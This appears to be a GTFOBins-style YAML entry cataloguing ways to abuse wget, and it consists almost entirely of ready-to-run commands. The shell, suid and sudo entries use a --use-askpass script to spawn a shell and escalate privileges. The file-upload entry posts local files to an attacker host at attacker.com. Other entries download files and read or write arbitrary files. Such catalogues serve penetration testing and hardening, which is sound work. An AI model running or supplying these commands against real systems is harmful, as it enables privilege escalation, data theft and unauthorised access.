---
functions:
  shell:
    - code: |
        TF=$(mktemp)
        chmod +x $TF
        echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
        wget --use-askpass=$TF 0
  file-upload:
    - description: Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data.
      code: |
        URL=http://attacker.com/
        LFILE=file_to_send
        wget --post-file=$LFILE $URL
  file-read:
    - description: The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.
      code: |
        LFILE=file_to_read
        wget -i $LFILE
  file-write:
    - description: The data to be written is treated as a list of URLs, one per line, which are actually fetched by `wget`. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data.
      code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo DATA > $TF
        wget -i $TF -o $LFILE
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        URL=http://attacker.com/file_to_get
        LFILE=file_to_save
        wget $URL -O $LFILE
  suid:
    - code: |
        TF=$(mktemp)
        chmod +x $TF
        echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
        ./wget --use-askpass=$TF 0
  sudo:
    - code: |
        TF=$(mktemp)
        chmod +x $TF
        echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
        sudo wget --use-askpass=$TF 0
---
